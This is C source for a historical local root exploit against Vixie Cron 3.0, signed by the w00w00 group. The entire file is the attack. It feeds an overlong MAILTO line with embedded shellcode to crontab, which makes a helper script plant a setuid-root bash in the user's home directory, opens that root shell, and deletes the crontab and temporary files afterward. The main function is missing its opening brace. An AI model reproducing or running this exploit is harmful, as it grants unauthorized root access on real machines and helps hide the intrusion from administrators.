/*
 * VixieCron 3.0 Proof of Concept Exploit - w00w00
 * 
 * Not only does Paul give up root with this one, but with his creative use of
 * strtok() he actually ends up putting the address of our shellcode in eip.  
 * 
 * Many Thanks: Cheez Wiz, Sangfroid
 * Thanks: stran9er, Shok
 * Props: attrition.org,mea_culpa,awr,minus,Int29,napster,el8.org,w00w00
 * Drops: Vixie, happyhacker.org, antionline.com, <insert your favorite web \
 *        defacement group here>
 *        
 * Hellos: pm,cy,bm,ceh,jm,pf,bh,wjg,spike.
 * 
 * -jbowie@el8.org
 * 
 */
   
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <pwd.h>

char shellcode[] =
        "\xeb\x40\x5e\x89\x76\x0c\x31\xc0\x89\x46\x0b\x89\xf3\xeb"
        "\x27w00w00:Ifwewerehackerswedownyourdumbass\x8d\x4e"
        "\x0c\x31\xd2\x89\x56\x16\xb0\x0b\xcd\x80\xe8\xbb\xff\xff"
        "\xff/tmp/w00w00";
        
int     
main(int argc,char *argv[])

        FILE *cfile,*tmpfile;
        struct stat sbuf;
        struct passwd *pw;
        int x;
        
        pw = getpwuid(getuid());
        
        chdir(pw->pw_dir);
        cfile = fopen("./cronny","a+");
        tmpfile = fopen("/tmp/w00w00","a+");
        
        fprintf(cfile,"MAILTO=");
        for(x=0;x<96;x++)
                fprintf(cfile,"w00w00 ");
        fprintf(cfile,"%s",shellcode);
        fprintf(cfile,"\n* * * * * date\n");
        fflush(cfile);

        fprintf(tmpfile,"#!/bin/sh\ncp /bin/bash %s\nchmod 4755 %s/bash\n", pw->pw_dir,pw->pw_dir);
        fflush(tmpfile);
          
        fclose(cfile),fclose(tmpfile);
   
        chmod("/tmp/w00w00",S_IXUSR|S_IXGRP|S_IXOTH);
   
        if(!(fork())) {
                execl("/usr/bin/crontab","crontab","./cronny",(char *)0);
        } else {  
                printf("Waiting for shell be patient....\n");
                for(;;) {
                        if(!(stat("./bash",&sbuf))) {
                                        break;
                        } else { sleep(5); }
                } 
                if((fork())) {
                        printf("Thank you for using w00warez!\n");
                        execl("./bash","bash",(char *)0);
                } else {  
                        remove("/tmp/w00w00");
                        sleep(5);
                        remove("./bash");
                        remove("./cronny");
                        execl("/usr/bin/crontab","crontab","-r",(char *)0);
                }
        }
}
